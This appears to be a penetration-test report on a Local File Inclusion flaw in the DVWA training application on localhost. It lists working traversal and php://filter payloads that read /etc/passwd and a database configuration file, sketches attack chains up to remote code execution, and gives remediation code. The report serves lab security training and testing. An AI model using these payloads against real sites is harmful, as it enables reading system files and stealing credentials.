FILE INCLUSION VULNERABILITY FINDINGS


VULNERABILITY TYPE: Local File Inclusion (LFI)
LOCATION: http://localhost/vulnerabilities/fi/
PARAMETER: page (GET)
SEVERITY: High (CVSS 7.5)
DATE TESTED: 2026-01-16

TESTING METHODOLOGY:
-------------------
1. Manual browser testing
2. Burp Suite Repeater testing
3. Multiple payload variations
4. PHP wrapper exploitation

SUCCESSFUL PAYLOADS:
-------------------

1. Directory Traversal - /etc/passwd
   URL: http://localhost/vulnerabilities/fi/?page=../../etc/passwd
   Result: Successfully read system password file
   Content Preview:
   ---
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   ---

2. Directory Traversal - Deeper Path
   URL: http://localhost/vulnerabilities/fi/?page=../../../../etc/passwd
   Result: Alternative path also successful

3. Configuration File Exposure
   URL: http://localhost/vulnerabilities/fi/?page=../../hackable/config/config.inc.php
   Result: Database credentials exposed
   Sensitive Data Found:
   - Database name: dvwa
   - Database user: [USERNAME]
   - Database password: [PASSWORD]
   - Database host: localhost

4. PHP Wrapper Exploitation
   URL: http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=include.php
   Result: File contents encoded in base64
   Technique: Bypasses some filtering mechanisms

BURP SUITE TESTING:
------------------
Tool: Burp Suite Community Edition
Method: Proxy + Repeater
Results:
- All payloads confirmed working
- Response shows full file contents
- No filtering or sanitization detected

VULNERABLE CODE ANALYSIS:
-------------------------
Likely vulnerable code structure:
php
<?php
$file = $_GET['page'];
include($file);  // Direct inclusion without validation!
?>


IMPACT ASSESSMENT:
-----------------

Confidentiality: HIGH
- System files readable (/etc/passwd)
- Configuration files exposed (database credentials)
- Application source code accessible

Integrity: LOW
- Cannot modify files (read-only exploitation)

Availability: NONE
- No impact on availability

Overall CVSS Score: 7.5 (High)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

ATTACK SCENARIOS:
----------------

Scenario 1: Credential Theft
1. Attacker discovers LFI vulnerability
2. Reads config.inc.php file
3. Obtains database credentials
4. Connects directly to MySQL database
5. Dumps all data

Scenario 2: Information Gathering
1. Read /etc/passwd to enumerate system users
2. Read Apache config files
3. Read application source code
4. Plan further attacks based on gathered info

Scenario 3: Remote Code Execution (Potential)
1. Upload malicious file via another vulnerability
2. Use LFI to include uploaded file
3. Execute arbitrary PHP code
4. Gain shell access

EVIDENCE FILES:
--------------
Screenshots:
1. lfi-etc-passwd-attempt.png - Initial test
2. lfi-passwd-success.png - Successful /etc/passwd read
3. lfi-config-file.png - Database config exposure
4. lfi-php-wrapper.png - PHP wrapper technique
5. burp-lfi-request-response.png - Burp Suite testing
6. burp-multiple-payloads.png - Various payloads tested

REMEDIATION RECOMMENDATIONS:
---------------------------

IMMEDIATE (Emergency Fix):
1. Disable the File Inclusion page immediately
2. Implement whitelist of allowed files
3. Remove direct file inclusion functionality

SHORT-TERM (Within 7 days):
1. Input Validation:
php
   $allowed_files = ['file1.php', 'file2.php', 'file3.php'];
   if (in_array($_GET['page'], $allowed_files)) {
       include($_GET['page']);
   } else {
       die("Invalid file");
   }


2. Path Sanitization:
    php
   $file = basename($_GET['page']);
   $file = str_replace(['../', '..\\'], '', $file);


3. Restrict Directory Access:
   php
   $base_dir = '/var/www/html/includes/';
   $file = $base_dir . basename($_GET['page']);
   if (file_exists($file) && strpos(realpath($file), $base_dir) === 0) {
       include($file);
   }

LONG-TERM (Within 30 days):
1. Code review all file operations
2. Implement Content Security Policy
3. Use a templating engine instead of direct includes
4. Regular security testing
5. Web Application Firewall (WAF) deployment

REFERENCES:
----------
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-98: Improper Control of Filename for Include/Require Statement

TESTER: Lakshan Maduranga 
DATE: 2026-01-16
STATUS: Confirmed Exploitable